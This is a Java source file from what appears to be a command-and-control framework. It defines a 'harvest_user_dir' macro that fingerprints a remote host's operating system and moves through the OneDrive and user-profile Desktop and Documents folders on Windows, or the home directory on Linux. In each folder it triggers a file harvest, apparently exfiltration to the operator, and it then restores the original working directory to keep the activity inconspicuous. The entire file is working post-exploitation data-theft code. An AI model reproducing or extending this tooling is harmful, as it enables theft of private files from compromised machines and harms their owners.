package c2.session.macro;

import c2.Commands;
import c2.HarvestProcessor;
import c2.session.IOManager;
import c2.win.WindowsCmdLineHelper;

public class UserDirectoryHarvester extends AbstractCommandMacro {

	public static String HARVEST_USER_DIRS_CMD = "harvest_user_dir";
	
	@Override
	public boolean isCommandMatch(String cmd) {
		return cmd.equals(HARVEST_USER_DIRS_CMD);
	}

	@Override
	public MacroOutcome processCmd(String cmd, int sessionId, String sessionStr) {
		MacroOutcome outcome = new MacroOutcome();
		
		sendCommand(Commands.OS_HERITAGE, sessionId, outcome);
		String response = awaitResponse(sessionId, outcome);
		response = response.replace(System.lineSeparator(), "");
		if(!response.equals(Commands.OS_HERITAGE_RESPONSE_WINDOWS) && !response.equals(Commands.OS_HERITAGE_RESPONSE_LINUX)) {
			outcome.addError("Unsupported operating system: " + response);
			return outcome;
		}
		
		String os = response;
		
		sendCommand(Commands.PWD, sessionId, outcome);
		response = awaitResponse(sessionId, outcome);
		String originalDirectory = null;
		if (!response.equals("")) {
			outcome.addMacroMessage("Saving original working directory, proceeding with macro");
			originalDirectory = response.replace(System.lineSeparator(), "");
		}else {
			outcome.addError("Unable to save current working directory, aborting macro.");
			return outcome;
		}
		
		if(os.equals(Commands.OS_HERITAGE_RESPONSE_WINDOWS)) {
		
		try {
			String onedriveDir = WindowsCmdLineHelper.resolveVariableDirectory(io, sessionId, "%ONEDRIVE%");
			outcome.addMacroMessage("Found OneDrive folder: " + onedriveDir);
			String cdToODDesktopCmd = Commands.CD + " " + onedriveDir + "\\Desktop";
			sendCommand(cdToODDesktopCmd, sessionId, outcome);
			response = awaitResponse(sessionId, outcome);
			response = response.replace(System.lineSeparator(), "");
			if (!response.equals(onedriveDir + "\\Desktop")) {
				outcome.addError("Unable to switch to OneDrive Desktop for harvest");
			} else {
				sendCommand(Commands.HARVEST_CURRENT_DIRECTORY, sessionId, outcome);
				response = awaitResponse(sessionId, outcome);
			}
			String cdToODDocumentsCmd = Commands.CD + " "  + onedriveDir + "\\Documents";
			sendCommand(cdToODDocumentsCmd, sessionId, outcome);
			response = awaitResponse(sessionId, outcome);
			response = response.replace(System.lineSeparator(), "");
			if (!response.contains(onedriveDir + "\\Documents")) {//Why contains? b/c we might get the Harvest Complete ack too
				outcome.addError("Unable to switch to OneDrive Documents for harvest");
			} else {
				sendCommand(Commands.HARVEST_CURRENT_DIRECTORY, sessionId, outcome);
				response = awaitResponse(sessionId, outcome);
			}
		}catch (Exception ex) {
			outcome.addMacroMessage("Could not find OneDrive folder, proceeding.");
		}
		
		try {
			String profileDir = WindowsCmdLineHelper.resolveVariableDirectory(io, sessionId, "%USERPROFILE%");
			outcome.addMacroMessage("Found user profile folder: " + profileDir);
			String cdToDesktopCmd = Commands.CD + " "  + profileDir + "\\Desktop";
			sendCommand(cdToDesktopCmd, sessionId, outcome);
			response = awaitResponse(sessionId, outcome);
			if (!response.contains(profileDir + "\\Desktop")) {//We still might get the "harvest complete"
				outcome.addError("Unable to switch to OneDrive Desktop for harvest");
			} else {
				sendCommand(Commands.HARVEST_CURRENT_DIRECTORY, sessionId, outcome);
				response = awaitResponse(sessionId, outcome);
			}
			String cdToDocumentsCmd = Commands.CD + " "  + profileDir + "\\Documents";
			sendCommand(cdToDocumentsCmd, sessionId, outcome);
			response = awaitResponse(sessionId, outcome);
			if (!response.contains(profileDir + "\\Documents")) {//Why contains? b/c we might get the Harvest Complete ack too
				outcome.addError("Unable to switch to OneDrive Documents for harvest");
			} else {
				sendCommand(Commands.HARVEST_CURRENT_DIRECTORY, sessionId, outcome);
				response = awaitResponse(sessionId, outcome);
			}
		}catch (Exception ex) {
			outcome.addMacroMessage("Could not find user profile folder, proceedind.");
		}
		}else {//Linux
			String cdToHomeDir = Commands.CD + " ~";
			sendCommand(cdToHomeDir, sessionId, outcome);
			response = awaitResponse(sessionId, outcome);
			if(response.contains("no such file or directory")) {
				outcome.addError("Cannot switch to Linux home directory");
			}else {
				sendCommand(Commands.HARVEST_CURRENT_DIRECTORY, sessionId, outcome);
				response = awaitResponse(sessionId, outcome);
			}
		}
		
		//Restore original
		sendCommand(Commands.CD + " " + originalDirectory, sessionId, outcome);
		response = awaitResponse(sessionId, outcome);
		response = response.replace(System.lineSeparator(), "");
		if (!response.equals(originalDirectory)) {
			outcome.addError("Unable to switch to original directory for harvest");
		} else {
			outcome.addMacroMessage(
					"Original working directory resumed, harvest underway in the background if directories found");
		}
		
		return outcome;
	}

}
